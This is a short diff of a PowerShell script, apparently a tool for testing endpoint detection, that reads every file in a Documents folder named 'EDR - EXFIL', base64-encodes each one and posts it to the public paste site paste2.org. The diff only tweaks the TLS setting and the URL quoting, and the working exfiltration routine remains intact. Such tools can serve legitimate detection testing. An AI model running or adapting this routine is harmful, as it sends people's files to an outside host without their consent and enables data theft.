@@ -2,8 +2,6 @@ $dir = $env:SystemDrive + $env:HOMEPATH + '\Documents\EDR - EXFIL'
 $files = gci $dir
 $output = $dir + '\output.txt'
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 ForEach ($file in $files)
 {
     $file = $file.FullName
@@ -15,7 +13,7 @@ ForEach ($file in $files)
 
         $base64string = $base64string.Replace('+', '%2B')
 
-        $request = Invoke-WebRequest https://paste2.org -Method Post -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response
+        $request = Invoke-WebRequest 'https://paste2.org' -Method Post -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response
         
         If ($request.ParsedHtml.title -match 'Viewing Paste')
         {
